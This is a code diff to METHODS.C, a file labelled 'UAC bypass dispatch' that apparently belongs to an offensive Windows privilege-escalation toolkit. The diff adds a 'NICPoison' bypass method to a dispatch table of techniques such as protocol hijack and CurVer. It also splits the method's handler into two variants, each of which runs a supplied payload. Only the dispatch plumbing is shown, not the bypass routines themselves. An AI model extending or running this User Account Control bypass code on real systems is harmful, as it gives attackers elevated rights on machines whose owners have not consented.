@@ -4,9 +4,9 @@
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     3.57
+*  VERSION:     3.58
 *
-*  DATE:        01 Nov 2021
+*  DATE:        01 Dec 2021
 *
 *  UAC bypass dispatch.
 *
@@ -130,7 +130,8 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodProtocolHijack, { NT_WIN10_THRESHOLD1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
     { MethodProtocolHijack, { NT_WIN10_REDSTONE5, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
     { MethodPca, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodCurVer, { NT_WIN10_THRESHOLD1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE }
+    { MethodCurVer, { NT_WIN10_THRESHOLD1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodNICPoison, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE }
 };
 
 /*
@@ -600,9 +601,22 @@ UCM_API(MethodNICPoison)
     UNREFERENCED_PARAMETER(Parameter);
     return STATUS_NOT_SUPPORTED;
 #else
-    return ucmNICPoisonMethod(
-        Parameter->PayloadCode,
-        Parameter->PayloadSize);
+    if (Parameter->Method == UacMethodNICPoison) {
+
+        return ucmNICPoisonMethod(
+            Parameter->PayloadCode,
+            Parameter->PayloadSize);
+
+    }
+    else if (Parameter->Method == UacMethodNICPoison2) {
+
+        return ucmNICPoisonMethod2(
+            Parameter->PayloadCode,
+            Parameter->PayloadSize);
+
+    }
+    else 
+        return STATUS_NOT_SUPPORTED;
 #endif
 }
 
